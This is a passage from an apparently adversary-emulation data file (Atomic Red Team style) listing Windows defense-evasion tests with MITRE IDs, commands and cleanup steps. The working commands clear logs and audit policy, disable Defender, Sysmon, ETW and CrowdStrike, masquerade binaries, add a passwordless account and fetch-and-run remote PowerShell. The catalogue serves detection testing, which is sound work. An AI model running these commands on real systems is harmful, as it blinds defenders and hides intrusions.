        "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e973a33ed29e267eb4f2e895489d3899",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "adce11c81bb77ae74660c6c743a0442d": {
        "description": "Clears Powershell history\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.003",
            "name": "Indicator Removal on Host: Clear Command History"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item (Get-PSReadlineOption).HistorySavePath",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "adce11c81bb77ae74660c6c743a0442d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6a8d25d65a7d481dc479f89c62af1e6a": {
        "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.002",
            "name": "Impair Defenses: Disable Windows Event Logging"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable && auditpol /set /category:\"Detailed Tracking\" /success:enable && auditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable",
                    "command": "auditpol /clear /y && auditpol /remove /allusers",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6a8d25d65a7d481dc479f89c62af1e6a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "66f816503d9ef2d1f5165a2da63bfc9c": {
        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.010",
            "name": "Signed Binary Proxy Execution: Regsvr32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:4774cd_RegSvr32.sct scrobj.dll",
                    "payloads": [
                        "4774cd_RegSvr32.sct"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "66f816503d9ef2d1f5165a2da63bfc9c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2a842a4929889b85e1a6fd2a2fd27ec7": {
        "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205\"\"\"))</script>'\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2a842a4929889b85e1a6fd2a2fd27ec7",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "7e4a00e15142a1c5edb9dd0ecc86f1d3": {
        "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /Q /F %APPDATA%\\notepad.exe >nul 2>&1",
                    "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y && cmd.exe /c %APPDATA%\\notepad.exe /B",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7e4a00e15142a1c5edb9dd0ecc86f1d3",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "984f60641d35e624e918eb60e2c37734": {
        "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "984f60641d35e624e918eb60e2c37734",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f210745005c4b77c38319fee8987eb15": {
        "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.005",
            "name": "Subvert Trust Controls: Mark-of-the-Web Bypass"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Dismount-DiskImage -ImagePath \"5fad3e_T1553.005.iso\" | Out-Null",
                    "command": "Mount-DiskImage -ImagePath \"5fad3e_T1553.005.iso\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "5fad3e_T1553.005.iso",
                        "5fad3e_T1553.005.iso"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "f210745005c4b77c38319fee8987eb15",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f82efa1ac00819fe5260af67800cbdcb": {
        "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /Q /F %APPDATA%\\taskhostw.exe >nul 2>&1",
                    "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y && cmd.exe /K %APPDATA%\\taskhostw.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f82efa1ac00819fe5260af67800cbdcb",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "1391d89067fa37461e65eac1bfb55a8b": {
        "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1216.001",
            "name": "Signed Script Proxy Execution: Pubprn"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1391d89067fa37461e65eac1bfb55a8b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8734f5df1819f82e52312063a392b844": {
        "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sysmon -u -i > nul 2>&1 && sysmon -i -accepteula -i > nul 2>&1 && %temp%\\Sysmon\\sysmon.exe -u > nul 2>&1 && %temp%\\Sysmon\\sysmon.exe -accepteula -i > nul 2>&1",
                    "command": "fltmc.exe unload SysmonDrv",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8734f5df1819f82e52312063a392b844",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d5ac8f5ec45224dc36453a9490845f23": {
        "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /Q /F %SystemRoot%\\Temp\\lsass.exe >nul 2>&1",
                    "command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe && %SystemRoot%\\Temp\\lsass.exe /B",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d5ac8f5ec45224dc36453a9490845f23",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "7fd07c188cf2be37e4d812caf0840e3d": {
        "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027.004",
            "name": "Obfuscated Files or Information: Compile After Delivery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del C:\\Windows\\Temp\\T1027.004.exe >nul 2>&1",
                    "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1027.004.exe af2f1c_calc.cs",
                    "payloads": [
                        "af2f1c_calc.cs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "7fd07c188cf2be37e4d812caf0840e3d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2fadd8c6533c03271daab1a879ea8ef0": {
        "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item -path $env:TEMP\\deleteme_T1551.004",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2fadd8c6533c03271daab1a879ea8ef0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "eee54f6c10eeccfa68e02ec386239023": {
        "description": "Execute arbitrary DLL file stored locally.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.008",
            "name": "Signed Binary Proxy Execution: Odbcconf"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "eee54f6c10eeccfa68e02ec386239023",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "fcd40bda91ac8562cefe4c91393efb31": {
        "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Send-MailMessage -From",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fcd40bda91ac8562cefe4c91393efb31",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "21a279cb142da9bc65cd4a19bef7a2d2": {
        "description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.006",
            "name": "Impair Defenses: Indicator Blocking"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > nul 2>&1",
                    "command": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "21a279cb142da9bc65cd4a19bef7a2d2",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f50ac24a71af47880d39813477d9b341": {
        "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f50ac24a71af47880d39813477d9b341",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "50fd14a080c6e8ed6455c1d2aa81cfe0": {
        "description": "Executes the code specified within a XSL script using a local payload.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1220",
            "name": "XSL Script Processing"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "wmic process list /FORMAT:\"e3e9ba_wmicscript.xsl\"",
                    "payloads": [
                        "e3e9ba_wmicscript.xsl"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "50fd14a080c6e8ed6455c1d2aa81cfe0",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "43e3334362b140924f001b256b229ee5": {
        "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0",
                    "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "43e3334362b140924f001b256b229ee5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ca23e384b06ab9ccb5069d103a206657": {
        "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rundll32.exe pcwutl.dll,LaunchApplication %windir%\\System32\\notepad.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ca23e384b06ab9ccb5069d103a206657",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2373e3cb6671c7f750cff8a94ebd0356": {
        "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.006",
            "name": "Indicator Removal on Host: Timestomp"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ChildItem $env:TEMP\\T1551.006_timestomp.txt | % { $_.CreationTime = \"01/01/1970 00:00:00\" }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2373e3cb6671c7f750cff8a94ebd0356",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "deaf0c3d54550c574416577922258bf2": {
        "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "deaf0c3d54550c574416577922258bf2",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "3c15abdc43fef1e4a05ef25fb29f928c": {
        "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\\4c870d_T1218.011_DefaultInstall.inf",
                    "payloads": [
                        "4c870d_T1218.011_DefaultInstall.inf"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "3c15abdc43fef1e4a05ef25fb29f928c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "0626f22d8f8d0902d69088cac33d80cb": {
        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.010",
            "name": "Signed Binary Proxy Execution: Regsvr32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\system32\\regsvr32.exe /s /i bafdf3_AllTheThingsx86.dll",
                    "payloads": [
                        "bafdf3_AllTheThingsx86.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "0626f22d8f8d0902d69088cac33d80cb",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f904f827be1d5ae9766c370947778ced": {
        "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1220",
            "name": "XSL Script Processing"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "wmic process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f904f827be1d5ae9766c370947778ced",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "0c05ae67acce3a0130e88a69c075810f": {
        "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /Q /F %APPDATA%\\svchost.exe >nul 2>&1",
                    "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y && cmd.exe /c %APPDATA%\\svchost.exe /B",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0c05ae67acce3a0130e88a69c075810f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "621c016fb5abf544cbf0f72a7e48fa23": {
        "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.002",
            "name": "Impair Defenses: Disable Windows Event Logging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){;   C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:false *>$null; }",
                    "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "621c016fb5abf544cbf0f72a7e48fa23",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "8beb34c915b17873e357c030d517be0a": {
        "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.006",
            "name": "Impair Defenses: Indicator Blocking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1",
                    "command": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8beb34c915b17873e357c030d517be0a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "be9d436d25abc40a95d31dd28ca7b0cf": {
        "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.006",
            "name": "Impair Defenses: Indicator Blocking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" -Name Operational -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" -Name Operational  -PropertyType DWord -Value 0 -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "be9d436d25abc40a95d31dd28ca7b0cf",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "05f8b752dbccff102ef530103bd8e550": {
        "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.001",
            "name": "Indicator Removal on Host: Clear Windows Event Logs"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "05f8b752dbccff102ef530103bd8e550",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2867429ec8a190420c257cacd9ac0950": {
        "description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2867429ec8a190420c257cacd9ac0950",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "bf221790e6405a508143578d70d6332b": {
        "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$excludedProcess = \"outlook.exe\"; Remove-MpPreference -ExclusionProcess  $excludedProcess",
                    "command": "$excludedProcess = \"outlook.exe\"; Add-MpPreference -ExclusionProcess $excludedProcess",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bf221790e6405a508143578d70d6332b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "83a5ad479c9e313e60f34380e193102a": {
        "description": "Creating a user with a username containing with a space on the end",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564",
            "name": "Hide Artifacts"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-LocalUser -Name \"Administrator \" 2>&1 | out-null",
                    "command": "New-LocalUser -Name \"Administrator \" -NoPassword",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "83a5ad479c9e313e60f34380e193102a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "3720451b2390e1ed49e3c42625ef519d": {
        "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3720451b2390e1ed49e3c42625ef519d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2e60ce3b2b9edcbec108a9abda95fa6f": {
        "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
